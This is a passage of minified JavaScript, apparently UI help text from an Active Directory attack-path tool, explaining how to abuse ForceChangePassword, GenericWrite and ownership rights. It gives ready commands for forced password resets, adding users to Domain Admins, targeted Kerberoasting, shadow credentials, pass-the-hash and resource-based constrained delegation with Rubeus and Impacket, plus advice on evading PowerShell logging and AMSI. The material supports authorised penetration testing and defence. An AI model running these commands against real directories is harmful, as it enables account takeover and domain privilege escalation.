v2."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4728"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"})]})},ForceChangePassword:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(A,{variant:"body2",children:[kr(t,e)," the capability to change the ",Cr(n)," ",r,"'s password without knowing that user's current password."]}),windowsAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[h(A,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),h(A,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),p(A,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]}),linuxAbuse:({sourceName:e,sourceType:t})=>p(u,{children:[h(A,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),h(A,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]}),opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"Executing this abuse with the net binary will necessarily require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),h(A,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4724 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for users that are obviously very high privilege groups (i.e.: Domain Admin users). Also be mindful that PowerShell v5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity. You may be able to completely evade those features by downgrading to PowerShell v2."}),h(A,{variant:"body2",children:"Finally, by changing a service account password, you may cause that service to stop functioning properly. This can be bad not only from an opsec perspective, but also a client management perspective. Be careful!"})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.sixdub.net/?p=579",children:"https://www.sixdub.net/?p=579"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"})]})},GenericWrite:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," generic write access to the ",Cr(n)," ",r,"."]}),h(A,{variant:"body2",children:'Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user'})]}),windowsAbuse:({sourceName:e,sourceType:t,targetType:r})=>{switch(r){case"Group":return p(u,{children:[h(A,{variant:"body2",children:"GenericWrite to a group allows you to directly modify group membership of the group."}),h(A,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),h(A,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"})]});case"User":return p(u,{children:[h(A,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),h(A,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),h(A,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]});case"GPO":return p(u,{children:[h(A,{variant:"body2",children:"With GenericWrite on a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),h(A,{variant:"body2",children:"This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with 'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for the given GPO. Therefore, you need write access to child objects of this folder or create child objects permission. The security descriptor of the GPO is reflected on the folder, meaning permissions to write child items on the GPO are required."})]});case"Computer":return p(u,{children:[h(A,{variant:"body2",children:"Generic write to a computer object can be used to perform a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});default:return null}},linuxAbuse:({sourceName:e,sourceType:t,targetType:r})=>{switch(r){case"Group":return p(u,{children:[h(A,{variant:"body2",children:"GenericWrite to a group allows you to directly modify group membership of the group."}),h(A,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),h(A,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replaced with"," ",h(A,{component:"pre",children:" ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),h(A,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'})]});case"User":return p(u,{children:[h(A,{variant:"body1",children:" Targeted Kerberoast "}),p(A,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),h(A,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),h(A,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return p(u,{children:[h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"GPO":return p(u,{children:[h(A,{variant:"body2",children:"With GenericWrite over a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]}),h(A,{variant:"body2",children:"This edge can be a false positive in rare scenarios. If you have GenericWrite on the GPO with 'This object only' (no inheritance) and no other permissions in the ACL, it is not possible to add or modify settings of the GPO. The GPO's settings are stored in SYSVOL under a folder for the given GPO. Therefore, you need write access to child objects of this folder or create child objects permission. The security descriptor of the GPO is reflected on the folder, meaning permissions to write child items on the GPO are required."})]});default:return null}},opsec:()=>h(A,{variant:"body2",children:"This depends on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/",children:"https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"})]})},Owns:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," ownership of the ",Cr(n)," ",r,"."]}),h(A,{variant:"body2",children:"Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL"})]}),windowsAbuse:({sourceName:e,sourceType:t,targetName:r,targetType:n,targetId:o,haslaps:a})=>{switch(n){case"Group":return p(u,{children:[h(A,{variant:"body2",children:"To abuse ownership of a group object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:'Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),h(A,{variant:"body2",children:"You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember."}),h(A,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),h(A,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"}),h(A,{variant:"body2",children:"Cleanup for this can be done using Remove-DomainObjectAcl"}),h(A,{component:"pre",children:'Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers'})]});case"User":return p(u,{children:[h(A,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),h(A,{variant:"body1",children:" Targeted Kerberoast "}),h(A,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),h(A,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),h(A,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"}),h(A,{variant:"body1",children:" Force Change Password "}),h(A,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),h(A,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),p(A,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"})]});case"Computer":return p(u,a?{children:[h(A,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),h(A,{variant:"body2",children:"Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password."}),h(A,{variant:"body2",children:"Alternatively, you can execute a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"})]}:{children:[h(A,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),h(A,{variant:"body2",children:"Once you have granted yourself this privilege, you can execute a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand 